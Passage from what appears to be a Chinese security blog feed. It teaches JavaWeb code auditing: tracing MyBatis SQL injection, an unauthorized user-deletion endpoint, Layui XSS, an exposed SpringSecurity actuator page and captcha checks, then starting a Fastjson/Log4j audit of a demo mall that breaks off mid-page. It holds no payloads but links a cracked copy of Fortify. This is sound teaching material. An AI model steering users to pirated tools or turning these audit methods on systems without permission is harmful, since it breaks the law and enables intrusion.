等页面都可以作为视图。</p><ul><li>控制器（controller）</li></ul><p>控制器是模型与视图之间的桥梁，控制着数据与用户的交互。</p><p>控制器通常负责从视图读取数据，处理用户输入，并向模型发送数据，也可以从模型中读取数据，再发送给视图，由视图显示。</p><p><strong>Java分层思想拓展学习：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/java-123/</span>p/<span class="hljs-number">9174547</span>.html<br></code></pre></td></tr></table></figure><h4 id="4-2、本项目目录结构"><a href="#4-2、本项目目录结构" class="headerlink" title="4.2、本项目目录结构"></a>4.2、本项目目录结构</h4><p>拿到一个JavaWeb项目，首先要了解项目整体结构。大致了解作者编写逻辑，搞清请求流程。</p><p><code>src/main</code>下面有两个目录，分别是<code>java</code>和<code>resources</code></p><p><code>java</code>目录中主要存放的是java代码</p><p><code>resources</code>目录中主要存放的是资源文件，比如：html、js、css等</p><p><img src="/img/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%841.jpg" alt="目录结构1"></p><p>在<code>java</code>目录下还有其他一些常见目录，具体含义整理如下：</p><p><strong>&#x2F;java目录下：</strong></p><p><code>annotation</code>：放置项目自定义注解</p><p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p><p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p><p><code>entity/</code>: 存放实体类</p><p><code>interceptor/</code>: 拦截器</p><p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p><p><code>utils/</code>: 存放工具类</p><p><code>dto/</code>: 存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p><p><code>vo/</code>: 视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p><p><code>constant/</code>: 存放常量</p><p><code>filter/</code>: 存放过滤器</p><p><strong>&#x2F;resources目录下：</strong></p><p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p><p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p><p><code>templates/</code>: 存放模版文件</p><p><code>application.properties</code>或<code>application.yml</code>: Spring Boot默认配置文件</p><p>推荐阅读《阿里巴巴Java开发手册》：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ucc-<span class="hljs-keyword">private</span>-download.oss-cn-beijing.aliyuncs.com/e<span class="hljs-number">9</span>af<span class="hljs-number">0</span>d<span class="hljs-number">4111234</span>bfda<span class="hljs-number">5813</span><span class="hljs-keyword">c</span><span class="hljs-number">72</span>a<span class="hljs-number">368</span>a<span class="hljs-number">168</span>.pdf?Expires<span class="hljs-operator">=</span><span class="hljs-number">1635387273</span>&amp;OSSAccessKeyId<span class="hljs-operator">=</span>LTAIvsP<span class="hljs-number">3</span>ECkg<span class="hljs-number">4</span>Nm<span class="hljs-number">9</span>&amp;Signature<span class="hljs-operator">=</span>oPo<span class="hljs-number">6</span>ow<span class="hljs-number">0</span>JdAwUqPnXMsYPHZCpxUI<span class="hljs-variable">%3</span>D<br></code></pre></td></tr></table></figure><h4 id="4-3、请求流程（简化）"><a href="#4-3、请求流程（简化）" class="headerlink" title="4.3、请求流程（简化）"></a>4.3、请求流程（简化）</h4><p>用户请求URL发送到服务器，服务器解析请求后发送到后端代码处理请求。</p><p>在后端代码处，首先经过<code>Filter(过滤器)</code>和<code>Interceptor(拦截器)</code>，然后根据请求的URL映射到绑定的<code>Controller</code>，之后调用<code>Service</code>接口类，然后再调用<code>serviceImpl</code>接口实现类，最后调用<code>DAO</code>。</p><p><code>controller</code>：负责简单的逻辑处理和参数校验功能，之后调用Service。</p><p><code>service</code>：接口类，主要负责业务模块逻辑处理。</p><p><code>serviceImpl</code>：接口实现类，实现类实现service接口中的方法。</p><p><code>DAO</code>：如果service涉及数据库操作就会调用dao。DAO主要处理数据库操作。DAO只做中间传递角色，涉及的SQL语句都写在了配置文件Mapper.xml中。位于<code>src/main/resources/mapper</code>中。</p><h2 id="五、漏洞挖掘之代码审计"><a href="#五、漏洞挖掘之代码审计" class="headerlink" title="五、漏洞挖掘之代码审计"></a>五、漏洞挖掘之代码审计</h2><h3 id="5-1、信息收集"><a href="#5-1、信息收集" class="headerlink" title="5.1、信息收集"></a>5.1、信息收集</h3><ul><li>pom.xml漏洞挖掘</li></ul><p>基本上所有项目都会根据项目所需引入第三方依赖库来使用，毕竟好用又方便。但如果引入带有漏洞的版本就会出现问题。</p><p>通过上面也了解到了，<code>pom.xml</code>统一管理第三方依赖。通过<code>groupId</code>，<code>artifactId</code> ，<code>version</code> 三个标识，我们可以了解到使用了哪个依赖库以及版本，从而可以确定是否存在漏洞。</p><p>使用<code>Fastjson 1.2.56</code>版本，该版本存在漏洞，如下图所示：</p><p><img src="/img/fastjson%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E.jpg" alt="fastjson版本漏洞"></p><p>在发现了第三依赖库存在漏洞版本时，可以进一步利用。</p><p>但有时，尽管使用了带有漏洞版本的组件，但并没有使用存在漏洞的相关函数。</p><p>比如<code>Fastjson</code>反序列化漏洞，该项目实际并没有使用到<code>parseObject</code>。</p><p><strong>注意：</strong></p><p><code>通过组件及版本寻找漏洞，最起码需要知道什么组件时干什么的，然后对于常见的组件看多了，也就知道什么版本有什么漏洞了，熟能生巧。</code></p><p>自动化检测第三方依赖包漏洞可使用<code>dependency-check</code>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">官方地址：<br>https:<span class="hljs-regexp">//</span>owasp.org<span class="hljs-regexp">/www-project-dependency-check/</span><br>Github地址：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jeremylong/</span>DependencyCheck<br></code></pre></td></tr></table></figure><ul><li>查看配置文件</li></ul><p>配置文件都在<code>src/main/resources</code>下面，名字通常为<code>application.yml</code>或者<code>application.properties</code>。配置文件中可能会存在数据库或其他组件的连接信息。</p><p><strong>数据库连接信息账号密码：</strong></p><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.jpg" alt="数据库配置信息"></p><p><strong>其他配置信息：</strong></p><p><img src="/img/druid%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF.jpg" alt="druid配置信息"></p><h3 id="5-2、SQL注入漏洞挖掘"><a href="#5-2、SQL注入漏洞挖掘" class="headerlink" title="5.2、SQL注入漏洞挖掘"></a>5.2、SQL注入漏洞挖掘</h3><p>本项目基于Mybatis操作数据库。通过前面的学习，我们了解到Mybatis错误的配置会导致SQL注入漏洞的存在，这是我们挖掘SQL注入漏洞的入口点。</p><p>我们先来回顾下：</p><p>Mybatis拼接sql有下面两种方式：</p><p><code>#&#123;&#125;</code>告诉 MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中，</p><p><code>$&#123;&#125;</code> 仅仅是纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换，直接替换字符串，会导致SQL注入产生。</p><p>一些不能使用<code>#&#123;&#125;</code>的场景：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">表名/字段名<br><span class="hljs-keyword">order</span> <span class="hljs-title">by</span>/<span class="hljs-keyword">group</span> <span class="hljs-title">by</span><br>like模糊查询<br><span class="hljs-keyword">in</span><br></code></pre></td></tr></table></figure><p>因此，我们在代码审计阶段进行SQL注入漏洞挖掘，应关注<code>xxxxMapper.xml</code>中使用<code>$&#123;&#125;</code>拼接SQL的地方，全局搜索关键字符。Windows快捷键<code>CTRL+SHIFT+F</code>（如果快捷键冲突，需自己更改）。</p><p>调出<code>Find in path</code>，File mask选择文件类型为<code>*.xml</code>，键入关键字符<code>$&#123;</code>，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%85%B3%E9%94%AE%E8%AF%8D%E6%90%9C%E7%B4%A2.png" alt="sql注入关键词搜索"></p><p>通过上述搜索，发现了SQL语句使用了<code>like</code>语句并使用<code>$</code>进行拼接参数，这种情况下无疑是存在SQL注入的。</p><p>我们逆向追踪所拼接的参数，看看是从前端哪个地方输入进来的。</p><p>首先在IDEA中安装<code>Free Mybatis Plugin </code>，该插件方便mapper.xml与mapper接口之间跳转。需在左上角<code>File -&gt; Settings -&gt; Plugin</code>中安装。</p><p><strong>逆向追踪参数流程，举例说明</strong></p><p>①、通过搜索还发现<code>src/main/resources/mybatis-mappers/DictMapper.xml</code>文件，第17行，存在使用<code>like</code>语句以及<code>$</code>拼接SQL。安装了<code>Free Mybatis Plugin</code>插件后，左侧会有绿色箭头，点击即可跳转到mapper接口处，也就是DAO层文件，如下图所示：</p><p><img src="/img/dictmapper%E7%AC%AC17%E8%A1%8C.jpg" alt="dictmapper第17行"></p><p><img src="/img/dictmapper%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%8E%A5%E5%8F%A3.jpg" alt="dictmapper跳转到接口"></p><p>②、我们继续向前找到谁调用了<code>DictDao.java</code>中的<code>getFuzzyDictByPage</code>，Windows系统按住<code>ctrl</code>键，鼠标左击<code>getFuzzyDictByPage</code>进入该方法，或者说查看谁用了这个方法。如下图所示：</p><p><img src="/img/%E6%9F%A5%E7%9C%8B%E8%B0%83%E7%94%A8%E9%93%BE.jpg" alt="查看调用链"></p><p>③、点击进入<code>DICTServiceImpl.java</code>文件，发现<code>getDictPage</code>函数中使用了&#96;&#96;getFuzzyDictByPage&#96;，如下图所示：</p><p><img src="/img/getdictpage%E5%87%BD%E6%95%B0.jpg" alt="getdictpage函数"></p><p>④、继续按住<code>ctrl</code>键，鼠标左击<code>getDictPage</code>方法，点击后，直接进入到了<code>DictController</code>文件中第43行，如下图所示：</p><p><img src="/img/dictcontroller.jpg" alt="dictcontroller"></p><p>找到Controller层后，发现并没有dictname参数，因为Controller中以实体类接收表单数据。进入<code>MyDict</code>发现该类为实体类，其中定义多个参数，如下图所示：</p><p><img src="/img/MyDict%E5%AE%9E%E4%BD%93%E7%B1%BB.jpg" alt="MyDict实体类"></p><p>⑥、经过上述参数逆向追踪，确定了<code>dictName为字典名称</code>位于<code>查询字典功能</code>处，接下来我们访问该功能，配合渗透测试进一步挖掘验证SQL注入漏洞。</p><h3 id="5-3、越权漏洞挖掘"><a href="#5-3、越权漏洞挖掘" class="headerlink" title="5.3、越权漏洞挖掘"></a>5.3、越权漏洞挖掘</h3><p>在渗透测试阶段挖掘漏洞时发现了越权漏洞，我们现在从代码审计角度跟踪一下删除流程。</p><p>通过URL路径<code>api/user</code>查看相关Controller，搜索发现为<code>UserController</code>，位于<code>src/main/java/com/codermy/myspringsecurity/plus/admin/controller/UserControlle</code>。进一步查找关于删除用户的的方法，发现在该文件的第115行~123行，通过<code>userId</code>删除用户，如下图所示：</p><p><img src="/img/%E8%B6%8A%E6%9D%83controller.jpg" alt="越权controller"></p><p>跟踪一下删除用户逻辑流程。</p><p>①、通过上述代码，发现<code>UserController</code>从前端接收<code>userId</code>参数，调用<code>userService.deleteUser(userId)</code>进行删除，此处无任何权限关联。</p><p>②、通过<code>userService</code>找到<code>userServiceImpl</code>实现类，位于<code>src/main/java/codermy/myspringsecurity/admin/service/impl/UserServiceImpl</code>。从中找到<code>deleteUser()</code>方法，如下图所示：</p><p><img src="/img/%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E5%AE%9E%E7%8E%B0%E7%B1%BB.jpg" alt="删除用户实现类"></p><p>③、从中可以看到，该方法首先使用了<code>checkUserAllowed()</code>方法根据<code>userId</code>校验用户是否允许操作。然后分别调用了<code>roleUserDao.deleteRoleUserByUserId(userId);</code>，<code>userJobDao.deleteUserJobByUserId(userId);</code>，<code>userDao.deleteUserById(userId);</code>通过<code>userId</code>删除用户，并且通过用户ID删除用户和岗位关联。按住<code>CTRL</code>键左击<code>deleteUserxxx</code>调用的方法，可以跳转到DAO层文件。如下图所示：</p><p><img src="/img/userdao%E5%B1%82.jpg" alt="userdao层"></p><p><img src="/img/userjobdao%E5%B1%82.jpg" alt="userjobdao层"></p><p><img src="/img/role.jpg" alt="role"></p><p>跟着删除用户整体流程逻辑走下来，发现userId是从用户侧获取的，也没有将userId与所删除的数据做关联，而且userId也不是从session中获取的，从而导致任意用户都可以调用该接口进行删除。</p><p>并且用户ID值极易进行遍历，从而进行批量任意用户删除。</p><h3 id="5-4、XSS漏洞挖掘"><a href="#5-4、XSS漏洞挖掘" class="headerlink" title="5.4、XSS漏洞挖掘"></a>5.4、XSS漏洞挖掘</h3><p>在开发一个网站项目时，开发人员不可能将所有的参数分别做过滤或转义。最好的办法是统一写个过滤&#x2F;转义XSS的Filter。</p><p>在本项目中全局搜索，没发现XSS相关过滤器（Filter）或拦截器（Interceptor）。初步判断存在XSS漏洞。</p><p>对后端简单分析后，初步判断存在XSS漏洞，然后我们对前端进行分析，是否有转义机制。</p><p>在了解了整个项目之后，发现前端使用了<code>Thymeleaf模板引擎</code>和<code>Layui框架</code>。</p><p>Thymeleaf中<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，<code>th:utext</code>不会将字符转义。也就是说使用了<code>th:utext</code>标签会出现XSS漏洞。经过全局搜索，发现只有两处使用了<code>th:text</code>标签。没有地方使用<code>th:utext</code>标签。</p><p>其经过分析<code>src/resouces/templates/</code>下的html文件。发现本项目前端还使用了<code>Layui框架</code>。</p><p>全局搜索<code>Layui</code>关键字，得到layui使用版本为<code>2.5.6</code></p><p>通过翻阅Layui的github中ISSUES发现该版本存在XSS漏洞。链接<code>https://github.com/sentsin/layui/issues/711</code></p><h4 id="Layui-table："><a href="#Layui-table：" class="headerlink" title="Layui.table："></a><strong>Layui.table：</strong></h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.layuion.com<span class="hljs-regexp">/doc/m</span>odules/table.html<span class="hljs-comment">#use</span><br></code></pre></td></tr></table></figure><p>table 模块是我们的又一走心之作，在 layui 2.0 的版本中全新推出，是 layui 最核心的组成之一。它用于对表格进行一些列功能和动态化数据操作，涵盖了日常业务所涉及的几乎全部需求。</p><p>Layui.table有三种渲染方式，本项目中使用了了<code>方法渲染</code>，使用了<code>table.render</code>。</p><p>​</p><p>在渗透测试阶段挖掘到了XSS漏洞。经过从代码层分析，该漏洞的出现主要分为两点：</p><ul><li><p>一是：后端没有对用户输入的字符进行转义或过滤。</p></li><li><p>二是：使用的前端框架存在XSS漏洞版本，也没有对返回到前端的参数进行过滤或转义。</p></li></ul><h3 id="5-5、SpringSecurity框架下未授权漏洞挖掘"><a href="#5-5、SpringSecurity框架下未授权漏洞挖掘" class="headerlink" title="5.5、SpringSecurity框架下未授权漏洞挖掘"></a>5.5、SpringSecurity框架下未授权漏洞挖掘</h3><p>本项目SprintSecurity配置代码位于<code>src/main/java/codermy/myspringsecurityplus/security/config/SpringSecurityConfig</code>。</p><p>SpringSecurity会配置一些放行的静态资源，有时错误的配置会将一些关键资源放行，造成未授权访问。这有可能是开发人员便于调试，有可能是粗心导致的。比如本项目中直接放行了<code>spring acatutor</code>监控页面，按理说这个页面需要登录才可以访问。不登录就可以未授权访问这个页面是存在很大风险的。如下图所示：</p><p><img src="/img/springsecurity%E6%94%BE%E8%A1%8C%E8%B5%84%E6%BA%90.jpg" alt="springsecurity放行资源"></p><p>SpringSecurity配置是链式结构，可以同时配置多项过滤。</p><h3 id="5-6、图形验证码绕过"><a href="#5-6、图形验证码绕过" class="headerlink" title="5.6、图形验证码绕过"></a>5.6、图形验证码绕过</h3><p>搜索关键字<code>captcha</code>等，找到相关代码。如下图所示：</p><p><img src="/img/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E6%90%9C%E7%B4%A2captcha.jpg" alt="图形验证码搜索captcha"></p><p>经搜索，图形验证码代码位于<code>src/main/java/com/codemy/mysringsecurityplus/security/filter/VerifyCoderFilter.java</code></p><p>让我们分析代码逻辑。</p><p>首先，判断了请求方法和请求路径。两者都为True进入验证码逻辑部分。如下图所示：</p><p><img src="/img/%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95%E5%92%8C%E8%B7%AF%E5%BE%84.jpg" alt="判断方法和路径"></p><p>然后获取属性值。使用<code>request.getSession()</code>获取cookie的session值，使用<code>request.getParameter(&quot;captcha&quot;)</code>获取请求body中captcha参数值，使用<code>request.getSession().getAttribute(&quot;captcha&quot;)</code>获取cookie中captcha值。如下图所示：</p><p><img src="/img/%E8%8E%B7%E5%8F%96captcha%E5%80%BC.jpg" alt="获取captcha值"></p><p>接下来，仅判断了从请求参数中获取的<code>captcha</code>值是否为空，为空的话先删除缓存里的验证码信息，然后报错。如下图所示：</p><p><img src="/img/%E5%88%A4%E6%96%ADcaptcha%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA.jpg" alt="判断captcha是否为空"></p><p>仅判断从参数中获取的值是否为空逻辑是不严谨的。但在代码下方是有完整的验证逻辑。我们继续分析下。</p><p>判断从Cookie中获取captcha属性值是否为空。为空报错。</p><p>最后使用<code>StrUtil.equalsIgnoreCase()</code>函数忽略大小写判断，从cookie中获取的captcha值和从请求中获取的captcha值是否相同。如果不同的话就会报错。如下图所示：</p><p><img src="/img/%E5%88%A4%E6%96%ADcaptcha%E4%B8%A4%E5%A4%84%E5%80%BC%E6%98%AF%E5%90%A6%E7%9B%B8%E5%90%8C.jpg" alt="判断captcha两处值是否相同"></p><p>开发人员有时为了便于调试程序，可能会暂时关闭繁琐的验证逻辑。到了最后程序正式上线忘记了将注释删除掉，粗心的举动导致问题的发生。</p><p>当然，不同的程序会存在不同的问题。需要我们细心分析。</p><h3 id="5-7、异常信息泄露"><a href="#5-7、异常信息泄露" class="headerlink" title="5.7、异常信息泄露"></a>5.7、异常信息泄露</h3><p>搜索关键字<code>e.printStackTrace()</code>，该函数会将异常调用信息。如下图所示：</p><p><img src="/img/%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.jpg" alt="异常信息泄露"></p><h3 id="5-8、Fortify自动化扫描"><a href="#5-8、Fortify自动化扫描" class="headerlink" title="5.8、Fortify自动化扫描"></a>5.8、Fortify自动化扫描</h3><p>Fottify 全名叫：Fortify SCA ，是HP的产品 ，是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，分析的过程中与它特有的软件安全漏洞规则集进行全面地匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并给予整理报告。扫描的结果包含详细的安全漏洞信息、安全知识说明、修复意见。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">破解版地址：<br>https:<span class="hljs-regexp">//</span>www.shungg.cn/<span class="hljs-number">301</span>.html<br></code></pre></td></tr></table></figure><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>本套练习基于真实项目进行了相关漏洞环境的改造。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/witmy/my</span>-springsecurity-plus<br></code></pre></td></tr></table></figure><p>但本身原系统也存在一些安全风险问题。也就是说大家迈出了第一步，就挖到了一枚小小的0day了呢。</p><p>愿君在安全漫漫之路，能收获至尊0day。</p><p>从基础动手练习，完成最完美的蜕变。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计</title>
    <link href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E7%89%88%EF%BC%8C%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8%E7%BA%A7%E7%B3%BB%E7%BB%9F%E7%9A%84Log4j2shell%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E7%89%88%EF%BC%8C%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8%E7%BA%A7%E7%B3%BB%E7%BB%9F%E7%9A%84Log4j2shell%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>【如需转载，请详细表明来源，请勿设置原创】</p><p>嗨，大家好，我是闪石星曜CyberSecurity创始人Power7089。</p><p>欢迎大家扫描下方二维码关注 <strong>“闪石星曜CyberSecurity”</strong> 公众号，这里专注分享渗透测试，Java代码审计，PHP代码审计等内容，都是非常干的干货哦。</p><p><img src="/img/%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="公众号"></p><p>如果你想系统化学习Java代码审计、PHP代码审计、渗透测试，欢迎了解加入对应的知识星球，分别为【炼石计划@Java代码审计】，【炼石计划@PHP代码审计】，【炼石计划@渗透攻防宇宙】，知识星球的名称也对应着深入学习的方向。</p><p>炼石计划理念：一个系统化从入门到提升学习的成长型知识星球。这里不仅注重夯实基础，更加专注实战进阶。</p><p>欢迎微信扫描下方二维码，加入对应的知识星球。努力成为六边形网络安全战士！</p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@Java代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.jpg" alt="炼石计划@PHP代码审计"></p><p><img src="/img/%E7%82%BC%E7%9F%B3%E8%AE%A1%E5%88%92@%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%AE%87%E5%AE%99.jpg" alt="炼石计划@渗透攻防宇宙"></p><p>本篇来自【炼石计划@Java代码审计】知识星球内部文章，公益分享学习。欢迎加入我们，系统化学习专业知识。</p><h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><p>迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p><h2 id="二、项目搭建"><a href="#二、项目搭建" class="headerlink" title="二、项目搭建"></a>二、项目搭建</h2><h3 id="1、环境要求"><a href="#1、环境要求" class="headerlink" title="1、环境要求"></a>1、环境要求</h3><p>1、<code>Windows 10</code>系统。</p><p>2、Java版本为<code>1.8.0_261</code>。</p><p>3、Mysql版本为<code>5.7</code>。我用的是PHPstudy集成的。</p><p>4、IDEA版本随意。</p><h3 id="2、项目部署流程"><a href="#2、项目部署流程" class="headerlink" title="2、项目部署流程"></a>2、项目部署流程</h3><p>①、命令行进入Mysql后，创建数据库名为<code>tmalldemodb</code>，并切换使用该数据库，如下图所示：</p><p><img src="/img/%E5%88%9B%E5%BB%BA%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="创建使用数据库"></p><p>②、将项目文件中的<code>/sqls/tmalldemodb.sql</code>的数据导入到<code>tmalldemodb</code>数据库，注意导入路径中应使用正斜杠<code>/</code>，如下图所示：</p><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE.jpg" alt="数据库中导入数据"></p><p>③、使用IDEA打开本项目，等待Maven自动加载依赖项，如果时间较长需要自行配置Maven加速源。几个现象表明项目部署成功。<code>pom.xml</code>文件无报错，项目代码已编译为<code>class</code>，<code>Run/Debug Configurations...</code>处显示可以运行。如下图所示：</p><p><img src="/img/%E5%8A%A0%E8%BD%BD%E6%88%90%E5%8A%9F.jpg" alt="加载成功"></p><p>④、修改<code>src/main/resouces/application.properties</code>配置文件内容，具体如下图所示：</p><p><img src="/img/%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.jpg" alt="修改配置文件"></p><p>⑤、点击启动<code>Run/Debug Configurations...</code>本项目，启动成功如下图所示：</p><p><img src="/img/idea%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8%E6%88%90%E5%8A%9F.jpg" alt="idea项目启动成功"></p><p>⑥、项目访问地址如下：</p><ul><li>前台地址：<code>http://127.0.0.1:8088/tmall</code></li><li>后台地址：<code>http://127.0.0.1:8088/tmall/admin</code></li></ul><p><img src="/img/%E5%89%8D%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg" alt="前台页面"></p><p><img src="/img/%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2.jpg" alt="后台页面"></p><p><strong>本项目Github地址：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tee.com<span class="hljs-regexp">/project_team/</span>Tmall_demo<br></code></pre></td></tr></table></figure><h2 id="三、代码审计漏洞挖掘"><a href="#三、代码审计漏洞挖掘" class="headerlink" title="三、代码审计漏洞挖掘"></a>三、代码审计漏洞挖掘</h2><h3 id="1、第三方组件漏洞审计"><a href="#1、第三方组件漏洞审计" class="headerlink" title="1、第三方组件漏洞审计"></a>1、第三方组件漏洞审计</h3><p>本项目是基于Maven构建的。对于Maven项目，我们首先从<code>pom.xml</code>文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点。</p><p>本项目引入的组件以及组件版本整理如下。</p><table><thead><tr><th>组件名称</th><th>组件版本</th></tr></thead><tbody><tr><td>SpringBoot</td><td>2.1.6.RELEASE</td></tr><tr><td>Fastjson</td><td>1.2.58</td></tr><tr><td>Mysql</td><td>5.1.47</td></tr><tr><td>Druid</td><td>1.1.19</td></tr><tr><td>Taglibs</td><td>1.2.5</td></tr><tr><td>Mybatis</td><td>3.5.1</td></tr><tr><td>Log4j</td><td>2.10.0</td></tr></tbody></table><p>整理完成后，如何确定该组件版本存在漏洞？最简单的方法无疑于从搜索引擎进行搜索，比如关键字：<code>Fastjson 漏洞</code>。进一步可从组件官网，CVE，CNVD，CNNVD等网站查询。</p><h3 id="2、组件漏洞代码审计"><a href="#2、组件漏洞代码审计" class="headerlink" title="2、组件漏洞代码审计"></a>2、组件漏洞代码审计</h3><p>通过查看<code>pom.xml</code>文件中引入的第三方插件，且经过搜索查询，发现Fastjson、Log4j、Mybatis引入存在漏洞的版本，我们进一步验证是否存在漏洞。</p><h3 id="2-1、Fastjson漏洞代码审计"><a href="#2-1、Fastjson漏洞代码审计" class="headerlink" title="2.1、Fastjson漏洞代码审计"></a>2.1、Fastjson漏洞代码审计</h3><p>本项目引入的Fastjson版本为1.2.58，该版本存在反序列化漏洞。我们进一步探索一番。</p><h4 id="2-1-1、Fastjson简述"><a href="#2-1-1、Fastjson简述" class="headerlink" title="2.1.1、Fastjson简述"></a>2.1.1、Fastjson简述</h4><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java对象之间相互转换。</p><p>两个主要接口是JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse，分别实现序列化和反序列化操作。</p><h4 id="2-1-1、Fastjson反序列化简述"><a href="#2-1-1、Fastjson反序列化简述" class="headerlink" title="2.1.1、Fastjson反序列化简述"></a>2.1.1、Fastjson反序列化简述</h4><p>Fastjson反序列化漏洞简单来说是出现在将JSON数据反序列化过程中出现的漏洞。</p><p>攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><h4 id="2-1-2、寻找漏洞触发点"><a href="#2-1-2、寻找漏洞触发点" class="headerlink" title="2.1.2、寻找漏洞触发点"></a>2.1.2、寻找漏洞触发点</h4><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数<code>JSON.parse()</code>和<code>JSON.parseObject()</code>。</p><p>全局搜索两个关键字，发现本项目存在<code>JSON.parseObject()</code>，如下图所示：</p><p><img src="/img/%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2parseObject.jpg" 